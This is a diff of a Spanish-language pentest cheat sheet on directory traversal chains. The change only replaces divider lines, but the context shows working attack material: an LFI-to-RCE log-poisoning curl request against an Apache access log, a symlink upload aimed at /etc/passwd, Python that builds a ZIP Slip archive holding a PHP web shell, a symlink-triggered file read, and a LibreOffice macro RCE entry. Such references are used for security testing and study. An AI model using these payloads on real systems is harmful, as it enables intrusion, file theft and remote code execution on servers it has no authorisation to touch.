@@ -20,7 +20,7 @@ linked:
 ---
 # Directory Traversal - Chains y Variantes
 
-***
+---
 
 ## LFI to RCE Chain
 
@@ -60,7 +60,7 @@ curl --data-urlencode "c=$PAYLOAD" -G \
   'https://target/page?file=../../../var/log/apache2/access.log'
 ```
 
-___
+---
 
 ## Path Traversal en File Upload
 
@@ -79,7 +79,7 @@ ___
 | `curl -F 'file=@symlink_to_passwd;filename=normal.txt' https://target/upload` | Symlink upload | Symlink combo. |
 ^pt-chain-upload
 
-___
+---
 
 ## ZIP Slip / Tar Slip / Archive Traversal
 
@@ -108,7 +108,7 @@ with zipfile.ZipFile('evil.zip', 'w') as zf:
                 '<?php system($_GET["c"]); ?>')
 ```
 
-___
+---
 
 ## Symlink Abuse
 
@@ -127,7 +127,7 @@ ___
 | `curl 'https://target/?file=/writable/symlink_to_secret'` post-create-link | Trigger LFI via symlink | LFI combo. |
 ^pt-chain-symlink
 
-___
+---
 
 ## ImageMagick / File Processors
 
@@ -147,4 +147,4 @@ ___
 | `libreoffice --headless --convert-to pdf evil.docx` (macro doc) | LibreOffice macro RCE | Macro doc. |
 ^pt-chain-image
 
-***
+---
